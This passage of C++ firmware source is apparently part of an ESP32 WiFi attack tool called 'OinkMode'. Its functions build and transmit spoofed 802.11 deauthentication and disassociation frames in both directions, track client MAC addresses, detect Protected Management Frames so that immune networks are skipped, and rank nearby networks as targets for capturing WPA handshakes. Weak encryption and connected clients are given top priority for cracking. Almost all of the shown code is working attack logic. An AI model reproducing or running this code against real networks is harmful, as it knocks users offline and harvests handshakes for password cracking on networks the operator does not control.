    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    for (uint8_t i = 0; i < count; i++) {
        // AP -> Client (pretend to be AP)
        sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
        
        // Client -> AP (pretend to be client) - bidirectional attack
        if (memcmp(station, broadcast, 6) != 0) {
            // Only if not broadcast - swap source/dest
            uint8_t reversePacket[26] = {
                0xC0, 0x00,  // Frame Control: Deauth
                0x00, 0x00,  // Duration
            };
            memcpy(reversePacket + 4, bssid, 6);     // To AP
            memcpy(reversePacket + 10, station, 6);  // From Client
            memcpy(reversePacket + 16, bssid, 6);    // BSSID
            reversePacket[22] = 0x00;
            reversePacket[23] = 0x00;
            reversePacket[24] = 1;  // Unspecified reason
            reversePacket[25] = 0x00;
            esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
        }
    }
}

void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Disassociation frame - some clients respond better to this
    uint8_t disassocPacket[26] = {
        0xA0, 0x00,  // Frame Control: Disassoc (0xA0 instead of 0xC0)
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence
        0x08, 0x00   // Reason code (Disassociated because station leaving)
    };
    
    memcpy(disassocPacket + 4, station, 6);
    memcpy(disassocPacket + 10, bssid, 6);
    memcpy(disassocPacket + 16, bssid, 6);
    disassocPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
}

void OinkMode::trackClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
    int netIdx = findNetwork(bssid);
    if (netIdx < 0) return;
    
    DetectedNetwork& net = networks[netIdx];
    
    // Check if client already tracked
    for (int i = 0; i < net.clientCount; i++) {
        if (memcmp(net.clients[i].mac, clientMac, 6) == 0) {
            net.clients[i].rssi = rssi;
            net.clients[i].lastSeen = millis();
            return;
        }
    }
    
    // Add new client if room
    if (net.clientCount < MAX_CLIENTS_PER_NETWORK) {
        memcpy(net.clients[net.clientCount].mac, clientMac, 6);
        net.clients[net.clientCount].rssi = rssi;
        net.clients[net.clientCount].lastSeen = millis();
        net.clientCount++;
        
        Serial.printf("[OINK] Client tracked: %02X:%02X:%02X:%02X:%02X:%02X -> %s\n",
                     clientMac[0], clientMac[1], clientMac[2],
                     clientMac[3], clientMac[4], clientMac[5],
                     net.ssid);
    }
}

bool OinkMode::detectPMF(const uint8_t* payload, uint16_t len) {
    // Parse RSN IE to detect PMF (Protected Management Frames)
    // RSN IE starts with tag 0x30
    uint16_t offset = 36;  // After fixed beacon fields
    
    while (offset + 2 < len) {
        uint8_t tag = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tag == 0x30 && tagLen >= 8) {  // RSN IE
            // RSN IE structure: version(2) + group cipher(4) + pairwise count(2) + ...
            // RSN capabilities are at the end, look for MFPC/MFPR bits
            uint16_t rsnOffset = offset + 2;
            uint16_t rsnEnd = rsnOffset + tagLen;
            
            // Skip version (2), group cipher (4)
            rsnOffset += 6;
            if (rsnOffset + 2 > rsnEnd) break;
            
            // Pairwise cipher count and suites
            uint16_t pairwiseCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (pairwiseCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // AKM count and suites
            uint16_t akmCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (akmCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // RSN Capabilities (2 bytes)
            uint16_t rsnCaps = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            
            // IEEE 802.11-2016 standard:
            // Bit 6: MFPC (Management Frame Protection Capable)
            // Bit 7: MFPR (Management Frame Protection Required)
            bool mfpr = (rsnCaps >> 7) & 0x01;
            
            if (mfpr) {
                return true;  // PMF required - deauth won't work
            }
        }
        
        offset += 2 + tagLen;
    }
    
    return false;
}

int OinkMode::findNetwork(const uint8_t* bssid) {
    for (int i = 0; i < (int)networks.size(); i++) {
        if (memcmp(networks[i].bssid, bssid, 6) == 0) {
            return i;
        }
    }
    return -1;
}

bool OinkMode::hasHandshakeFor(const uint8_t* bssid) {
    for (const auto& hs : handshakes) {
        if (memcmp(hs.bssid, bssid, 6) == 0 && hs.isComplete()) {
            return true;
        }
    }
    return false;
}

void OinkMode::sortNetworksByPriority() {
    // Sort networks by attack priority:
    // 1. Has clients + no handshake + not PMF (highest priority)
    // 2. Weak auth (Open, WEP, WPA1) + no handshake
    // 3. WPA2 without PMF + no handshake
    // 4. Networks with handshake already (skip)
    // 5. PMF protected (can't attack)
    
    std::sort(networks.begin(), networks.end(), [](const DetectedNetwork& a, const DetectedNetwork& b) {
        // Calculate priority score (lower = higher priority)
        auto getPriority = [](const DetectedNetwork& net) -> int {
            // Already have handshake - lowest priority
            if (net.hasHandshake) return 100;
            // PMF protected - can't attack
            if (net.hasPMF) return 99;
            // Open networks - no handshake to capture
            if (net.authmode == WIFI_AUTH_OPEN) return 98;
            
            int priority = 50;  // Base
            
            // Has clients = much higher priority (deauth more likely to work)
            if (net.clientCount > 0) priority -= 30;
            
            // Auth mode priority (weaker = higher priority for cracking)
            switch (net.authmode) {
                case WIFI_AUTH_WEP: priority -= 15; break;   // Deprecated, easy to crack
                case WIFI_AUTH_WPA_PSK: priority -= 10; break;  // Weak
                case WIFI_AUTH_WPA_WPA2_PSK: priority -= 5; break;
                case WIFI_AUTH_WPA2_PSK: priority += 0; break;  // Standard
                case WIFI_AUTH_WPA3_PSK: priority += 10; break;  // Usually has PMF
                default: break;
            }
            
            // Fewer attack attempts = higher priority (try new ones first)
            priority += net.attackAttempts * 5;
            
            // Strong signal = higher priority (more reliable)
            if (net.rssi > -50) priority -= 5;
            else if (net.rssi > -70) priority -= 2;
            
            return priority;
        };
        
        return getPriority(a) < getPriority(b);
    });
}

int OinkMode::getNextTarget() {
    // Smart target selection with retry logic
    // First pass: networks with clients, no handshake, attackAttempts < 3
    for (int i = 0; i < (int)networks.size(); i++) {
        if (networks[i].hasPMF) continue;
        if (networks[i].hasHandshake) continue;
        if (networks[i].authmode == WIFI_AUTH_OPEN) continue;  // Open = no handshake
        if (networks[i].clientCount > 0 && networks[i].attackAttempts < 3) {
            return i;
        }
    }
    
    // Second pass: any network without handshake, attackAttempts < 2
    for (int i = 0; i < (int)networks.size(); i++) {
        if (networks[i].hasPMF) continue;
        if (networks[i].hasHandshake) continue;
        if (networks[i].authmode == WIFI_AUTH_OPEN) continue;
        if (networks[i].attackAttempts < 2) {
            return i;
        }
    }
    
    // Third pass: retry networks with clients even if attempted before
    for (int i = 0; i < (int)networks.size(); i++) {
        if (networks[i].hasPMF) continue;
        if (networks[i].hasHandshake) continue;
        if (networks[i].authmode == WIFI_AUTH_OPEN) continue;
        if (networks[i].clientCount > 0) {
            return i;
        }
    }
    
    return -1;  // No suitable targets
}
